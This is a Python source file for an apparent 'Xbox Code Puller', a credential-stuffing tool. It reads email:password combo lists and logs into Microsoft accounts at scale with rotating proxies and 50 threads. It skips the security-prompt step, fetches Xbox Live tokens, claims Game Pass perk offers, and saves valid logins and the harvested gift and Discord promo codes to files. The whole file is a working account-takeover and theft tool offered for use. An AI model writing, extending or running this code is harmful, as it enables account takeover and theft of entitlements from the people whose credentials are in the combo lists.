import requests
import re
import time
import random
import string
import os
import sys
import subprocess
from urllib.parse import urlparse, parse_qs
from typing import Dict, List, Optional, Tuple
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock, RLock
from tkinter import Tk, filedialog
import colorama

# Add Program directory to path to allow imports
current_dir = os.path.dirname(os.path.abspath(__file__))
if current_dir not in sys.path:
    sys.path.append(current_dir)

# Import ConfigManager
try:
    from Config.ConfigManager import config_manager
except ImportError:
    # Fallback if running directly or path issues
    sys.path.append(os.path.join(current_dir, 'Config'))
    try:
        from ConfigManager import config_manager
    except ImportError:
        # Define a dummy manager if file is missing
        class DummyConfig:
            def get_setting(self, k, d): return d
            def set_setting(self, k, v): pass
        config_manager = DummyConfig()

# Import Util for UI style
try:
    from Config.Util import *
    # Re-import datetime class to avoid conflict with datetime module from Util
    from datetime import datetime
except ImportError:
    # Define fallback style if Util is missing
    colorama.init()
    blue = colorama.Fore.BLUE
    white = colorama.Fore.WHITE
    green = colorama.Fore.GREEN
    red = colorama.Fore.RED
    reset = colorama.Fore.RESET
    
    def current_time_hour():
        return datetime.now().strftime('%H:%M:%S')
    
    BEFORE = f'{blue}[{white}'
    AFTER = f'{blue}]'
    INPUT = f'{BEFORE}>{AFTER} |'
    INFO = f'{BEFORE}!{AFTER} |'
    ERROR = f'{BEFORE}x{AFTER} |'
    ADD = f'{BEFORE}+{AFTER} |'
    WAIT = f'{BEFORE}~{AFTER} |'
    NOTE = f'{BEFORE}NOTE{AFTER} |'
    
    GEN_VALID = f'{green}[{white}+{green}] |'
    GEN_INVALID = f'{red}[{white}x{red}] |'
    
    def Title(t):
        if os.name == 'nt':
            os.system(f'title {t}')

# Thread-safe locks
log_lock = RLock()
file_lock = RLock()
stats_lock = RLock()

# ============================================================================
# GLOBAL STATISTICS
# ============================================================================
class Statistics:
    """Thread-safe statistics tracker"""
    def __init__(self):
        self.accounts_checked = 0
        self.promo_codes_found = 0
        self.gift_codes_found = 0
        self.successful_logins = 0
        self.failed_logins = 0
    
    def increment_checked(self):
        with stats_lock:
            self.accounts_checked += 1
            self.update_title()
    
    def increment_promos(self, count=1):
        with stats_lock:
            self.promo_codes_found += count
            self.update_title()
    
    def increment_gifts(self, count=1):
        with stats_lock:
            self.gift_codes_found += count
            self.update_title()
    
    def increment_success(self):
        with stats_lock:
            self.successful_logins += 1
            self.update_title()
    
    def increment_failed(self):
        with stats_lock:
            self.failed_logins += 1
            self.update_title()
    
    def update_title(self):
        Title(f"Xbox Code Puller | Checked: {self.accounts_checked} | Hits: {self.successful_logins} | Codes: {self.promo_codes_found + self.gift_codes_found}")

# Global statistics instance
stats = Statistics()

# ============================================================================
# CONFIGURATION
# ============================================================================
class Config:
    """Global configuration"""
    THREAD_DELAY = 1.0
    USE_PROXY = False
    PROXY_LIST = []
    OUTPUT_DIR = ""  # Will be set on startup

# ============================================================================
# FILE OPERATIONS
# ============================================================================
def save_to_file(filename: str, content: str, mode: str = 'a'):
    """Thread-safe file writing"""
    with file_lock:
        try:
            filepath = os.path.join(Config.OUTPUT_DIR, filename)
            with open(filepath, mode, encoding='utf-8') as f:
                f.write(content)
        except Exception as e:
            with log_lock:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error saving to {filename}: {e}")

def save_code_immediately(code_info: Dict, email: str, gamertag: str):
    """Save code to appropriate files immediately when found"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    code = code_info.get('code', 'N/A')
    offer_id = code_info.get('offer_id', 'N/A')
    status = code_info.get('status', 'unknown')
    
    # Determine if it's a promo or gift code
    is_promo = 'promos.discord.gg' in code
    
    # Format for allcodes.txt with full capture
    all_codes_entry = f"""
{'='*60}
[CAPTURE] {timestamp}
Email: {email}
Gamertag: {gamertag}
Code Type: {'PROMO' if is_promo else 'GIFT'}
Code: {code}
Offer ID: {offer_id}
Status: {status}
Claimed Date: {code_info.get('claimed_date', 'unknown')}
{'='*60}
"""
    
    # Save to allcodes.txt
    save_to_file('allcodes.txt', all_codes_entry)
    
    # Save to specific file (promos.txt or codes.txt)
    if is_promo:
        promo_entry = f"{code} | Status: {status}\n"
        save_to_file('promos.txt', promo_entry)
        stats.increment_promos()
    else:
        gift_entry = f"{code}\n"
        save_to_file('codes.txt', gift_entry)
        stats.increment_gifts()

def save_successful_login(email: str, password: str, gamertag: str):
    """Save successful login to hits.txt"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    hit_entry = f"{timestamp} | {email}:{password} | GT: {gamertag}\n"
    save_to_file('hits.txt', hit_entry)
    # Only print login success if we want verbose logs, but usually we just want code hits
    # keeping it minimal as per user request "only display one hits per line" / "make it look like tools"

# ============================================================================
# PROXY MANAGER
# ============================================================================
class ProxyManager:
    """Manage proxy rotation"""
    def __init__(self, proxy_list: List[str]):
        self.proxies = proxy_list
        self.current_index = 0
        self.lock = Lock()
    
    def get_next_proxy(self) -> Optional[Dict]:
        """Get next proxy in rotation"""
        if not self.proxies:
            return None
        
        with self.lock:
            proxy = self.proxies[self.current_index]
            self.current_index = (self.current_index + 1) % len(self.proxies)
            return {
                'http': proxy,
                'https': proxy
            }

# ============================================================================
# RATE LIMITER
# ============================================================================
class RateLimiter:
    """Simple rate limiter for domain requests"""
    
    def __init__(self, delay: float = 1.0):
        self.delay = delay
        self.last_request = {}
        self.lock = Lock()
    
    def wait_for_domain(self, url: str):
        """Wait if needed before making request to domain"""
        domain = urlparse(url).netloc
        with self.lock:
            if domain in self.last_request:
                elapsed = time.time() - self.last_request[domain]
                if elapsed < self.delay:
                    sleep_time = self.delay - elapsed
                    time.sleep(sleep_time)
            self.last_request[domain] = time.time()

# ============================================================================
# MICROSOFT OAUTH AUTHENTICATOR
# ============================================================================
MICROSOFT_OAUTH_URL = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'

class MicrosoftAuthenticator:
    """Handle Microsoft OAuth authentication"""

    def __init__(self, session: Optional[requests.Session] = None):
        self.session = session or requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
        })

    def get_oauth_tokens(self) -> Tuple[Optional[str], Optional[str]]:
        """Get OAuth tokens (PPFT and URL POST) from Microsoft"""
        try:
            response = self.session.get(MICROSOFT_OAUTH_URL, timeout=15)
            text = response.text
            
            # Find PPFT token (Robust Regex)
            ppft_match = re.search(r'name="PPFT" id="i0327" value="([^"]+)"', text) or \
                         re.search(r'name="PPFT"[\s\S]*?value="([^"]+)"', text) or \
                         re.search(r'value="([^"]+)"\s+name="PPFT"', text) or \
                         re.search(r'value=\"(.+?)\"', text, re.S) or \
                         re.search(r'value=\\\"(.+?)\\\"', text, re.S)

            if ppft_match:
                ppft_token = ppft_match.group(1)
                
                # Find URL POST
                url_post_match = re.search(r'"urlPost":"([^"]+)"', text) or \
                                 re.search(r'urlPost:\'([^\']+)\'', text) or \
                                 re.search(r'action="([^"]+)"', text) # Fallback to form action

                if url_post_match:
                    url_post = url_post_match.group(1)
                    return (url_post, ppft_token)
            
            return (None, None)
        except Exception:
            return (None, None)

    def login(self, email: str, password: str, url_post: str, ppft_token: str, max_retries: int = 3) -> Optional[str]:
        """Perform Microsoft login and get RPS token"""
        tries = 0
        while tries < max_retries:
            try:
                data = {
                    'login': email,
                    'loginfmt': email,
                    'passwd': password,
                    'PPFT': ppft_token
                }
                
                login_request = self.session.post(
                    url_post,
                    data=data,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'},
                    allow_redirects=True,
                    timeout=15
                )
                
                # Check if token is in URL fragment
                if '#' in login_request.url:
                    fragment = urlparse(login_request.url).fragment
                    token = parse_qs(fragment).get('access_token', ['None'])[0]
                    if token != 'None':
                        return token
                
                # Handle security prompt
                if 'cancel?mkt=' in login_request.text:
                    try:
                        ipt_match = re.search(r'(?<="ipt" value=").+?(?=">)', login_request.text)
                        pprid_match = re.search(r'(?<="pprid" value=").+?(?=">)', login_request.text)
                        uaid_match = re.search(r'(?<="uaid" value=").+?(?=">)', login_request.text)
                        action_match = re.search(r'(?<=id="fmHF" action=").+?(?=" )', login_request.text)
                        
                        if ipt_match and pprid_match and uaid_match and action_match:
                            data = {
                                'ipt': ipt_match.group(),
                                'pprid': pprid_match.group(),
                                'uaid': uaid_match.group()
                            }
                            action_url = action_match.group()
                            
                            ret = self.session.post(action_url, data=data, allow_redirects=True, timeout=15)
                            return_url_match = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text)
                            
                            if return_url_match:
                                return_url = return_url_match.group()
                                fin = self.session.get(return_url, allow_redirects=True, timeout=15)
                                if '#' in fin.url:
                                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                                    if token != 'None':
                                        return token
                    except Exception:
                        pass
                
                # Check for incorrect password
                if 'password is incorrect' in login_request.text.lower():
                    return None
                
            except Exception:
                pass
            
            tries += 1
            if tries < max_retries:
                time.sleep(1)
        
        return None

    def authenticate(self, email: str, password: str) -> Optional[str]:
        """Complete authentication flow"""
        url_post, ppft_token = self.get_oauth_tokens()
        if not url_post or not ppft_token:
            return None
        return self.login(email, password, url_post, ppft_token)

# ============================================================================
# XBOX CHECKER
# ============================================================================
class XboxChecker:
    """Check Xbox profile and get tokens"""

    def __init__(self, session: requests.Session, rate_limiter=None):
        self.session = session
        self.rate_limiter = rate_limiter or RateLimiter()

    def get_xbox_tokens(self, rps_token: str, max_retries: int = 3) -> Tuple[Optional[str], Optional[str]]:
        """Get Xbox Live UHS and XSTS tokens with retry logic"""
        base_delay = 2
        for attempt in range(max_retries):
            try:
                user_token = self._get_user_token(rps_token, attempt)
                if not user_token:
                    if attempt < max_retries - 1:
                        time.sleep(base_delay * (2 ** attempt))
                        continue
                    return (None, None)
                
                uhs, xsts_token = self._get_xsts_token(user_token, attempt)
                if uhs and xsts_token:
                    return (uhs, xsts_token)
                
                if attempt < max_retries - 1:
                    time.sleep(base_delay * (2 ** attempt))
                else:
                    return (None, None)
                    
            except Exception:
                if attempt < max_retries - 1:
                    time.sleep(base_delay * (2 ** attempt))
                else:
                    return (None, None)
        
        return (None, None)

    def get_gamertag(self, uhs: str, xsts_token: str) -> Optional[str]:
        """Get Xbox gamertag"""
        try:
            auth_header = f'XBL3.0 x={uhs};{xsts_token}'
            response = self.session.get(
                'https://profile.xboxlive.com/users/me/profile/settings',
                headers={
                    'Authorization': auth_header,
                    'x-xbl-contract-version': '3'
                },
                params={'settings': 'Gamertag'},
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                settings = data.get('profileUsers', [{}])[0].get('settings', [])
                for setting in settings:
                    if setting.get('id') == 'Gamertag':
                        return setting.get('value')
            
            return None
        except Exception:
            return None

    def _get_user_token(self, rps_token: str, attempt: int = 0) -> Optional[str]:
        """Get Xbox User Token from RPS token"""
        try:
            if self.rate_limiter:
                self.rate_limiter.wait_for_domain('https://user.auth.xboxlive.com/user/authenticate')
            
            response = self.session.post(
                'https://user.auth.xboxlive.com/user/authenticate',
                json={
                    'RelyingParty': 'http://auth.xboxlive.com',
                    'TokenType': 'JWT',
                    'Properties': {
                        'AuthMethod': 'RPS',
                        'SiteName': 'user.auth.xboxlive.com',
                        'RpsTicket': rps_token
                    }
                },
                headers={
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                token = data.get('Token')
                if token:
                    return token
            
            return None
        except Exception:
            return None

    def _get_xsts_token(self, user_token: str, attempt: int = 0) -> Tuple[Optional[str], Optional[str]]:
        """Get XSTS token from user token"""
        try:
            if self.rate_limiter:
                self.rate_limiter.wait_for_domain('https://xsts.auth.xboxlive.com/xsts/authorize')
            
            response = self.session.post(
                'https://xsts.auth.xboxlive.com/xsts/authorize',
                json={
                    'RelyingParty': 'http://xboxlive.com',
                    'TokenType': 'JWT',
                    'Properties': {
                        'UserTokens': [user_token],
                        'SandboxId': 'RETAIL'
                    }
                },
                headers={
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                uhs = data.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs')
                xsts_token = data.get('Token')
                if uhs and xsts_token:
                    return (uhs, xsts_token)
            
            return (None, None)
        except Exception:
            return (None, None)

# ============================================================================
# XBOX CODES FETCHER
# ============================================================================
class XboxCodesFetcher:
    """Fetch Xbox Game Pass codes"""

    def __init__(self, session: requests.Session):
        self.session = session

    def fetch_codes(self, uhs: str, xsts_token: str, email: str, gamertag: str) -> List[Dict]:
        """Fetch all Xbox codes and save immediately"""
        try:
            perks_data = self._get_perks_list(uhs, xsts_token)
            
            if not perks_data:
                return []
            
            codes = []
            offers = perks_data.get('offers', [])
            
            for i, offer in enumerate(offers, 1):
                offer_id = offer.get('offerId')
                offer_status = offer.get('offerStatus', 'unknown')
                resource = offer.get('resource')
                resource_type = offer.get('resourceType', 'unknown')
                claimed_date = offer.get('claimedDate')
                
                if not offer_id:
                    continue
                
                # Check if claimed and has resource
                if offer_status == 'claimed' and resource:
                    code_info = {
                        'code': resource,
                        'offer_id': offer_id,
                        'status': 'claimed',
                        'claimed_date': claimed_date or 'unknown',
                        'resource_type': resource_type
                    }
                    codes.append(code_info)
                    save_code_immediately(code_info, email, gamertag)
                    
                elif offer_status == 'available':
                    # Try to claim
                    code = self._claim_offer(uhs, xsts_token, offer_id)
                    if code:
                        code_info = {
                            'code': code,
                            'offer_id': offer_id,
                            'status': 'newly_claimed',
                            'claimed_date': datetime.now().strftime('%Y-%m-%d'),
                            'resource_type': resource_type
                        }
                        codes.append(code_info)
                        save_code_immediately(code_info, email, gamertag)
            
            return codes
            
        except Exception:
            return []

    def _get_perks_list(self, uhs: str, xsts_token: str) -> Optional[Dict]:
        """Get list of all perks"""
        try:
            auth_header = f'XBL3.0 x={uhs};{xsts_token}'
            response = self.session.get(
                'https://profile.gamepass.com/v2/offers',
                headers={
                    'Authorization': auth_header,
                    'Content-Type': 'application/json',
                    'User-Agent': 'okhttp/4.12.0'
                },
                timeout=30
            )
            
            if response.status_code == 200:
                return response.json()
            else:
                return None
        except Exception:
            return None

    def _claim_offer(self, uhs: str, xsts_token: str, offer_id: str) -> Optional[str]:
        """Claim an available offer and get the code"""
        try:
            time.sleep(1)
            
            auth_header = f'XBL3.0 x={uhs};{xsts_token}'
            cv_base = ''.join(random.choices(string.ascii_letters + string.digits, k=22))
            ms_cv = f'{cv_base}.0'
            
            for method in ['POST', 'PUT']:
                headers = {
                    'Authorization': auth_header,
                    'Content-Type': 'application/json',
                    'User-Agent': 'okhttp/4.12.0',
                    'ms-cv': ms_cv,
                    'Accept': 'application/json',
                    'Accept-Language': 'en-US',
                    'X-XBL-Contract-Version': '2'
                }
                
                if method == 'POST':
                    response = self.session.post(
                        f'https://profile.gamepass.com/v2/offers/{offer_id}',
                        headers=headers,
                        json={},
                        timeout=30
                    )
                else:
                    response = self.session.put(
                        f'https://profile.gamepass.com/v2/offers/{offer_id}',
                        headers=headers,
                        json={},
                        timeout=30
                    )
                
                if response.status_code in [200, 201]:
                    data = response.json()
                    code = data.get('resource')
                    if code:
                        return code
                        
            return None
            
        except Exception:
            return None

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================
def load_accounts_from_file(filepath: str) -> List[Tuple[str, str]]:
    """Load email:password combinations from a text file"""
    accounts = []
    
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            for line_num, line in enumerate(f, 1):
                line = line.strip()
                if not line or line.startswith('#') or ':' not in line:
                    continue
                
                parts = line.split(':', 1)
                if len(parts) != 2:
                    continue
                
                email = parts[0].strip()
                password = parts[1].strip()
                
                if email and password:
                    accounts.append((email, password))
        
        with log_lock:
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Loaded {len(accounts)} accounts from {os.path.basename(filepath)}")
        return accounts
        
    except Exception as e:
        with log_lock:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error reading file: {e}")
        return []

def load_proxies_from_file(filepath: str) -> List[str]:
    """Load proxies from file"""
    proxies = []
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    proxies.append(line)
        with log_lock:
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Loaded {len(proxies)} proxies")
        return proxies
    except Exception as e:
        with log_lock:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error reading proxy file: {e}")
        return []

def process_account(email: str, password: str, account_num: int = 1, total_accounts: int = 1, 
                   proxy_manager: Optional[ProxyManager] = None) -> Dict:
    """Process a single account and fetch codes"""
    
    result = {
        'email': email,
        'success': False,
        'gamertag': None,
        'codes': [],
        'error': None
    }
    
    try:
        # Create session
        session = requests.Session()
        
        # Set proxy if available
        if proxy_manager and Config.USE_PROXY:
            proxy = proxy_manager.get_next_proxy()
            if proxy:
                session.proxies.update(proxy)
        
        rate_limiter = RateLimiter(delay=Config.THREAD_DELAY)
        
        # Step 1: Microsoft OAuth
        authenticator = MicrosoftAuthenticator(session)
        rps_token = authenticator.authenticate(email, password)
        
        if not rps_token:
            result['error'] = "Failed to get RPS token"
            stats.increment_failed()
            stats.increment_checked()
            # Silent failure as per request
            return result
        
        # Step 2: Xbox tokens
        xbox_checker = XboxChecker(session, rate_limiter)
        uhs, xsts_token = xbox_checker.get_xbox_tokens(rps_token)
        
        if not uhs or not xsts_token:
            result['error'] = "Failed to get Xbox tokens"
            stats.increment_failed()
            stats.increment_checked()
            # Silent failure as per request
            return result
        
        # Step 3: Get gamertag
        gamertag = xbox_checker.get_gamertag(uhs, xsts_token)
        if not gamertag:
            gamertag = "Unknown"
        
        # Save successful login
        save_successful_login(email, password, gamertag)
        stats.increment_success()
        # Removed "Login Success" print
        
        # Step 4: Fetch codes
        codes_fetcher = XboxCodesFetcher(session)
        codes = codes_fetcher.fetch_codes(uhs, xsts_token, email, gamertag)
        
        # Calculate stats for display
        promo_count = sum(1 for c in codes if 'promos.discord.gg' in c.get('code', ''))
        gift_count = len(codes) - promo_count
        
        result['codes'] = codes
        result['success'] = True
        stats.increment_checked()
        
        # Only show if there are codes or links found
        if gift_count > 0 or promo_count > 0:
            with log_lock:
                # Format: [ + ] mail | codes count | links count
                print(f"{BEFORE + current_time_hour() + AFTER} {GEN_VALID} {white}{email}{reset} | Codes: {white}{gift_count}{reset} | Links: {white}{promo_count}{reset}")
        
        return result
        
    except Exception as e:
        result['error'] = str(e)
        stats.increment_failed()
        stats.increment_checked()
        # Silent error as per request
        return result

# ============================================================================
# MAIN FUNCTION
# ============================================================================
def main():
    """Main function"""
    Clear()
    Title("Xbox Code Puller - Initializing")
    
    # Header Banner
    print(f"""
{blue}  ________    ___.                  __________      .__  .__                
{blue}  \______ \   \_ |__   _______  ___ \______   \__ __|  | |  |   ___________ 
{blue}   |    |  \   | __ \ /  _ \  \/  /  |     ___/  |  \  | |  | _/ __ \_  __ \\
{blue}   |    `   \  | \_\ (  <_> >    <   |    |   |  |  /  |_|  |_\  ___/|  | \/
{blue}  /_______  /  |___  /\____/__/\_ \  |____|   |____/|____/____/\___  >__|   
{blue}          \/       \/            \/                                \/       
    """)
    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} {white}Xbox Game Pass Code Puller{reset}")
    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} {white}Starting...{reset}")
    
    # Initialize Tkinter for file dialogs
    root = Tk()
    root.withdraw()
    root.attributes('-topmost', True)

    # Create output directory
    main_results_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'Results')
    Config.OUTPUT_DIR = os.path.join(main_results_dir, 'Puller')
    os.makedirs(Config.OUTPUT_DIR, exist_ok=True)
    
    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Output Directory: {white}{Config.OUTPUT_DIR}{reset}")
    
    # Load Config Silently
    try:
        max_workers = int(config_manager.get_setting("threads", 50))
    except:
        max_workers = 50
    
    use_proxy = config_manager.get_setting("proxies_enabled", True)
    Config.USE_PROXY = use_proxy

    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Config Loaded: {white}{max_workers} Threads{reset} | Proxy: {white}{'Enabled' if use_proxy else 'Disabled'}{reset}")

    # Load Accounts via Dialog
    print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Please select your accounts file...")
    accounts_file = filedialog.askopenfilename(
        title="Select Accounts File",
        filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")]
    )
    
    if not accounts_file:
        print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} No file selected. Exiting.")
        time.sleep(2)
        return
    
    accounts = load_accounts_from_file(accounts_file)
    if not accounts:
        print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} No valid accounts found.")
        time.sleep(2)
        return

    # Load Proxies via Dialog (if enabled)
    proxy_manager = None
    if Config.USE_PROXY:
        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Please select your proxies file...")
        proxies_file = filedialog.askopenfilename(
            title="Select Proxies File",
            filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")]
        )
        
        if proxies_file:
            proxies = load_proxies_from_file(proxies_file)
            if proxies:
                proxy_manager = ProxyManager(proxies)
            else:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} No proxies found in file. Disabling proxy mode.")
                Config.USE_PROXY = False
        else:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} No proxy file selected. Disabling proxy mode.")
            Config.USE_PROXY = False
    
    # Initialize output files
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    save_to_file('promos.txt', f"=== PROMO CODES - Started: {timestamp} ===\n", 'w')
    save_to_file('codes.txt', f"=== GIFT CODES - Started: {timestamp} ===\n", 'w')
    save_to_file('allcodes.txt', f"=== ALL CODES (WITH CAPTURE) - Started: {timestamp} ===\n", 'w')
    save_to_file('hits.txt', f"=== SUCCESSFUL LOGINS - Started: {timestamp} ===\n", 'w')
    
    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Starting with {white}{max_workers}{blue} threads...{reset}")
    Title("Xbox Code Puller - Running...")
    
    if max_workers == 1:
        for i, (email, password) in enumerate(accounts, 1):
            process_account(email, password, i, len(accounts), proxy_manager)
    else:
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_account = {}
            for i, (email, password) in enumerate(accounts, 1):
                future = executor.submit(process_account, email, password, i, len(accounts), proxy_manager)
                future_to_account[future] = (i, email)
            
            for future in as_completed(future_to_account):
                future.result()
    
    print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} {green}Process Completed!{reset}")
    stats.update_title()

    # Ask to check codes
    print(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Check found codes? (y/n): ", end="")
    choice = input().lower()
    if choice == 'y':
        check_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'Code-Checker.py')
        if os.path.exists(check_script):
            codes_file = os.path.join(Config.OUTPUT_DIR, 'codes.txt')
            # Ensure codes file exists before trying to check
            if os.path.exists(codes_file):
                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Starting code checker...")
                subprocess.run([sys.executable, check_script, "--auto", accounts_file, codes_file])
            else:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} No codes file found to check")
        else:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Could not find Code-Checker.py")
    
    input(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Press Enter to exit...")

if __name__ == "__main__":
    main()
